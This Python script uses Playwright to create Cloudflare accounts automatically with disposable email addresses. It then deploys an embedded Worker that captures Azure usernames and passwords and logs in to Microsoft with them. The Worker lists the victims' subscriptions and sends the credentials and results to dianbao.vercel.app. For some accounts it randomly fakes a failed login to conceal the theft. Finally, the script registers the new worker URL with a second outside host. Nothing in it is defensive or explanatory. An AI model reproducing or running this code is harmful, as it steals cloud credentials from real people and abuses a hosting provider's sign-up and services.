import random
import string
import sys
import time

from playwright.sync_api import sync_playwright

workerJs = ('''------WebKitFormBoundaryKd5XeAFGRK1EHD5B
Content-Disposition: form-data; name="script"; filename="blob"
Content-Type: application/javascript

addEventListener("fetch", (event) => {
  event.respondWith(
    handleRequest(event).catch(
      (err) => new Response(err.stack, { status: 501 })
    )
  );
});

async function handleRequest(event) {
  const { pathname } = new URL(event.request.url)
  if (pathname.startsWith("/api/subscriptions")) {
    // login
    const url = new URL(event.request.url)
    const queryString = url.search.slice(1).replace("email", "username")
    let init = {
      body: "grant_type=password&scope=openid&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&resource=https%3A%2F%2Fmanagement.core.windows.net%2F&"+queryString,
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8', 'Accept-Encoding': 'gzip, deflate', 'Accept': 'application/json', 'Connection': 'keep-alive', 'Accept-Charset': 'utf-8', 'client-request-id': '8bc123d6-6fc3-4830-a896-3cea871ede9e', 'return-client-request-id': 'true', 'x-client-SKU': 'Python', 'x-client-Ver': '1.2.7', 'x-client-OS': 'win32', 'x-client-CPU': 'x64'},
    }
    var response = await fetch("https://login.microsoftonline.com/common/oauth2/token", init)
    var result = await response.json()
    if (response.status != 200) {
      return new Response(JSON.stringify(result), response)
    }
    // get subscriptions
    let access_token = result["access_token"]
    init = {
      method: 'GET',
      headers: {'User-Agent': 'azsdk-python-mgmt-subscription/3.1.1 ', 'Accept-Encoding': 'gzip, deflate', 'Accept': 'application/json', 'Connection': 'keep-alive', 'x-ms-client-request-id': 'd3264264-2eb2-11ed-90d9-00224816ac99', 'Authorization': 'Bearer ' + access_token},
    }
    response = await fetch("https://management.azure.com/subscriptions?api-version=2016-06-01", init)
    result = await response.json()
    if (response.status != 200) {
      return new Response(JSON.stringify(result), response)
    }
    let resultGetSub = result["value"]
    let resultArray = new Array()
    var flag = false
    for (var i=0, l=resultGetSub.length; i<l; i++) {
      if (!resultGetSub[i].displayName.toLowerCase().search("starter")) flag = true
      resultArray.push({"id":resultGetSub[i].id, "authorizationSource":resultGetSub[i].authorizationSource, "state":resultGetSub[i].state, "environmentName":"AzureCloud", "name":resultGetSub[i].displayName})
    }
    if (flag) {
      if (getRandomInt(0, 3) == 1) {
        await fetch("https://dianbao.vercel.app/send/3ADBAA05CB2E1/"+encodeURIComponent(queryString+"|"+JSON.stringify(resultArray)+"|ok"))
        return fetch("https://login.microsoftonline.com/common/oauth2/token", {
          body: "grant_type=password&scope=openid&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&resource=https%3A%2F%2Fmanagement.core.windows.net%2F&username=1&password=1",
          method: 'POST',
          headers: {'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8', 'Accept-Encoding': 'gzip, deflate', 'Accept': 'application/json', 'Connection': 'keep-alive', 'Accept-Charset': 'utf-8', 'client-request-id': '8bc123d6-6fc3-4830-a896-3cea871ede9e', 'return-client-request-id': 'true', 'x-client-SKU': 'Python', 'x-client-Ver': '1.2.7', 'x-client-OS': 'win32', 'x-client-CPU': 'x64'},
        })
      }
    }
    await fetch("https://dianbao.vercel.app/send/3ADBAA05CB2E1/"+encodeURIComponent(queryString+"|"+JSON.stringify(resultArray)))
    return new Response(JSON.stringify(resultArray), response)
  }
}

function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min) + min);
}
------WebKitFormBoundaryKd5XeAFGRK1EHD5B
Content-Disposition: form-data; name="metadata"; filename="blob"
Content-Type: application/json

{"bindings":[],"body_part":"script"}
------WebKitFormBoundaryKd5XeAFGRK1EHD5B--
''').encode(encoding='utf-8')


def getmidstring(html, start_str, end):
    start = html.find(start_str)
    if start >= 0:
        start += len(start_str)
        end = html.find(end, start)
        if end >= 0:
            return html[start:end].strip()

try:
  with sync_playwright() as p:
      username = ''.join(random.sample(string.ascii_lowercase, 10))
      browser = p.firefox.launch(headless=True)
      context2 = browser.new_context()
      page = browser.new_page()
      page2 = context2.new_page()
      page.goto('http://srbacs.org/')
      page2.goto("https://dash.cloudflare.com/sign-up")
      page.wait_for_selector("#customShortid")
      page.locator("#customShortid").click()
      page.locator("#shortid").fill(username)
      page.locator("#customShortid").click()
      page.wait_for_load_state()
      page2.wait_for_selector("[name='email']")
      page2.locator("[name='email']").fill(username + "@srbacs.org")
      page2.locator("[name='password']").fill("535128725Fnardn@")
      try:
          page2.get_by_role("button").get_by_text("Sign Up").click(timeout=1000)
      except:
          page2.get_by_role("button").get_by_text("Create Account").click()
      page2.wait_for_selector("#react-app > div > div > aside > div > nav > div > ul > li:nth-child(5) > a")
      page2.locator("#react-app > div > div > aside > div > nav > div > ul > li:nth-child(5) > a").click()
      page2.wait_for_selector("#react-app > div > div > div.c_ha.c_dc.c_c.c_hb > main > div > div > div:nth-child(4) > "
                              "div > div > form > div.c_t > button")
      page2.locator("#react-app > div > div > div.c_ha.c_dc.c_c.c_hb > main > div > div > div:nth-child(4) > div > div "
                    "> form > div.c_t > button").click()
      page2.get_by_role("button").get_by_text("Continue with Free").click()
      page.wait_for_selector("#epostalar > ul > li.mail.active > a > div.gonderen", timeout=60000)
      page.click("#epostalar > ul > li.mail.active > a > div.gonderen")
      time.sleep(1)

      url = "https://dash.cloudflare.com/email-verification?token=" + getmidstring(page.content(),
                                                                                   "<a href=\"https://dash"
                                                                                   ".cloudflare.com"
                                                                                   "/email-verification"
                                                                                   "?token=", "\"")
      page.close()
      if url == "":
          browser.close()
          sys.exit(1)
      page2.goto(url)
      page2.wait_for_timeout(timeout=30000)
      page2.goto("https://dash.cloudflare.com/")
      page2.wait_for_selector("#react-app > div > div > aside > div > nav > div > ul > li:nth-child(5) > a")
      page2.locator("#react-app > div > div > aside > div > nav > div > ul > li:nth-child(5) > a").click()
      accountToken = page2.locator("pre").inner_html()
      page2.get_by_text("Create a Service").click()
      serviceName = page2.locator("[name='service']").input_value()
      page2.get_by_role("button").get_by_text("Create service").click()
      page2.wait_for_timeout(timeout=10000)
      page2.get_by_text("Quick edit").click()
      page2.wait_for_timeout(timeout=10000)
      cookies = context2.cookies()
      cookieStr = ""
      for i in cookies:
          try:
              cookieStr = cookieStr + i['name'] + "=" + i['value'] + ";"
          except:
              pass
      url = "https://dash.cloudflare.com/api/v4/accounts/%s/workers/services/%s/environments/production?include_subdomain_availability=true" % (accountToken, serviceName)
      resp = context2.request.put(
          url=url,
          headers={
              "Content-type": "multipart/form-data; boundary=----WebKitFormBoundaryKd5XeAFGRK1EHD5B",
              "Cookie": cookieStr,
              "Content-Length": "4016",
              "Origin": "https://dash.cloudflare.com",
              "Referer": "https://dash.cloudflare.com/",
              # "sec-ch-ua": "\"Microsoft Edge\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
              "x-atok": "1669499763-ATOKda0a64952b075bf5c4ec80bda120f6e4765fe646b73b9693",
              "x-cross-site-security": "dash"
          },
          data=workerJs
      ).json()
      if resp['success']:
          context2.request.get(url="http://oci-sj-1.jiyin.me/lllllllllll.php?api=https://%s.%s.workers.dev/" % (serviceName, username))
      browser.close()
except:
  pass
